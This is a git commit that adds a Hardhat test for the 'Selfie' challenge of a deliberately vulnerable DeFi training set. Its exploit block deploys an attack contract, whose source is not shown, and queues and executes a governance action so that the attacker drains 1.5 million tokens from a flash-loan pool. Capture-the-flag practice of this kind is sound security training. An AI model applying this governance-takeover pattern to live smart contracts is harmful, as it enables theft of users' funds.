f60a398d8487906092e42a33d7c3051c4c8293ee
sidarth16 <ssidarth1999@gmail.com>
2022-07-01 08:36:19 +0530

    init test Selfie

---
+++ tests/selfie/selfie.challenge.js
@@ -0,0 +1,66 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Selfie', function () {
+    let deployer, attacker;
+
+    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
+    
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+        
+        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
+        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
+        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
+
+        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
+        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
+        this.pool = await SelfiePoolFactory.deploy(
+            this.token.address,
+            this.governance.address    
+        );
+
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.be.equal(TOKENS_IN_POOL);
+
+        console.log("Deployer : ", deployer.address)
+        console.log("Attacker : ", attacker.address)
+        console.log("Token : ", this.token.address)
+        console.log("Governance : ", this.governance.address)
+        console.log("pool : ", this.pool.address)
+        console.log("")
+        
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        const AttackSelfiePoolFactory = await ethers.getContractFactory('AttackSelfiePool', attacker);
+        attackSelfie = await AttackSelfiePoolFactory.deploy(this.token.address, this.pool.address, this.governance.address);
+
+        console.log("AttackSelfie : ", attackSelfie.address)
+        console.log("")
+        let id = await attackSelfie.callStatic.attack(TOKENS_IN_POOL)
+        console.log(id)
+        let tx = await attackSelfie.connect(attacker).attack(TOKENS_IN_POOL)
+        console.log("")
+        await ethers.provider.send("evm_increaseTime", [(2 * 24 * 60 * 60)]); // 5 days
+        await this.governance.connect(attacker).executeAction(id)
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
+        // Attacker has taken all tokens from the pool
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.be.equal(TOKENS_IN_POOL);        
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.be.equal('0');
+    });
+});
